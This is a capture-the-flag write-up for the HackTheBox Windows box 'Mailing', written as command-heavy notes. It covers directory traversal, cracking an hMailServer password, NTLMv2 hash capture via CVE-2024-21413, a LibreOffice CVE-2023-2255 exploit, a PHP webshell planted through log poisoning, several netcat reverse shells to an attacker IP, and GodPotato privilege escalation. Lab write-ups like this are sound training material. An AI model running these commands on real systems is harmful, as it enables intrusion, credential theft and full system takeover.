## 📌 Box Info
- **OS**: [Windows](Windows)
- **Difficulty**: [Easy](Easy)
- Platform: [HTB](HTB)
- Prep: [OSCP](OSCP.md)
- **Exploits Used**:
    
    - File‑read/dir‑traversal via `download.php`
    - CVE‑2024‑21413 Outlook/Windows Mail NTLMv2 capture
    - WinRM & SMB auth bypass
    - CVE‑2023‑2255 LibreOffice document RCE
    - Log‑poisoning → webshell include → GodPotato
        

**Open Ports:**  
[SMTP](https://chatgpt.com/c/SMTP) 25/tcp  
[HTTP](https://chatgpt.com/c/HTTP) 80/tcp  
[POP3](https://chatgpt.com/c/POP3) 110/tcp  
[IMAP](https://chatgpt.com/c/IMAP) 143/tcp  [IMAPS](https://chatgpt.com/c/IMAPS) 993/tcp  
[SMTPS](https://chatgpt.com/c/SMTPS) 465/tcp  [Submission](https://chatgpt.com/c/Submission) 587/tcp  
[SMB](https://chatgpt.com/c/SMB) 445/tcp  
[WinRM](https://chatgpt.com/c/WinRM) 5985/tcp

**Tools:**  
nmap, ffuf, feroxbuster, curl, smbclient, netexec, Responder, crackstation, hashcat, swaks, smtplib, evil‑winrm, nc, PowerShell, LibreOffice

---

## Recon 🔍

```bash
nmap -p- --min-rate 10000 10.10.11.14
nmap -p 25,80,110,135,139,143,445,465,587,993,5040,5985 -sCV 10.10.11.14
ffuf -u http://10.10.11.14 -H "Host: FUZZ.mailing.htb" \
     -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -mc all -ac
feroxbuster -u http://mailing.htb -x php,aspx
```

---

## Shell as maya 🐚

1. **Dir‑Traversal File Read**
    
    ```bash
    curl 'http://mailing.htb/download.php?file=../../windows/system32/drivers/etc/hosts'
    curl 'http://mailing.htb/download.php?file=../../Program+Files+(x86)/hMailServer/bin/hMailServer.ini'
    ```
    
2. **Crack hMailServer MD5** → `homenetworkingadministrator`
    
3. **SMTP Auth**
    
    ```bash
    swaks --auth-user 'administrator@mailing.htb' --auth LOGIN \
          --auth-password homenetworkingadministrator --quit-after AUTH --server mailing.htb
    ```
    
4. **CVE‑2024‑21413 NTLMv2 Capture**
    
    - Send malicious HTML email (Outlook/Windows Mail PoC)
        
    - Run Responder on tun0 → capture `maya` NTLMv2 hash
        
    - Crack with hashcat → `m4y4ngs4ri`
        
5. **SMB & WinRM Access**
    
    ```bash
    netexec smb mailing.htb -u maya -p m4y4ngs4ri  
    evil-winrm -i mailing.htb -u maya -p m4y4ngs4ri  
    ```
    

---

## Shell as localadmin 👤

1. **Enumerate SMB Shares** → `Important Documents` (read/write)
    
2. **CVE‑2023‑2255 LibreOffice RCE**
    
    ```bash
    python CVE-2023-2255.py \
      --cmd 'cmd.exe /c C:\ProgramData\nc64.exe -e cmd.exe 10.10.14.6 443' \
      --output exploit.odt
    smbclient '//mailing.htb/Important Documents' -U maya -P m4y4ngs4ri \
      -c 'put exploit.odt; put /opt/nc.exe/nc64.exe'
    ```
    
3. **Deliver & Execute**
    
    ```ps1
    copy "\\Important Documents\exploit.odt" C:\Users\maya\Desktop
    # Open in LibreOffice → reverse shell back to attacker
    ```
    

---

## Shell as defaultapppool 🌐

1. **Log‑Poisoning Webshell**
    
    ```bash
    telnet mailing.htb 25
    HELO <?php system($_REQUEST['cmd']); ?>
    ```
    
2. **Include via download.php**
    
    ```bash
    curl 'http://mailing.htb/download.php?file=../../progra~2/hmailserver/logs/hmailserver_2024-09-05.log&cmd=\programdata\nc64.exe+10.10.14.6+443+-e+cmd.exe'
    ```
    
3. **Reverse Shell** → `iis apppool\defaultapppool`
    

---

## Shell as SYSTEM 👑

1. **GodPotato on SeImpersonatePrivilege**
    
    ```bash
    gp.exe -cmd "\programdata\nc64.exe -e cmd.exe 10.10.14.6 443"
    ```
    
2. **SYSTEM** → read `root.txt`
    

---

## Actions Learned 🎓

- Directory‐traversal to leak configs & source
    
- MD5 hash cracking for admin creds
    
- NTLMv2 capture via CVE‑2024‑21413 & Responder
    
- SMB/WinRM pivot with cracked creds
    
- LibreOffice macro RCE (CVE‑2023‑2255) via SMB share
    
- Log‑poisoning to plant PHP shell in hMailServer logs
    
- GodPotato exploitation of SeImpersonatePrivilege
    

---

## References 🔗

- CVE-2024-21413 Outlook/Windows Mail RCE PoC
    
- CVE-2023-2255 LibreOffice “floating frames” RCE
    
- hMailServer .ini format & defaults
    
- HackTricks: 7‑Zip/PowerShell wildcards & symlinks
    
- Responder & hashcat NTLMv2 cracking techniques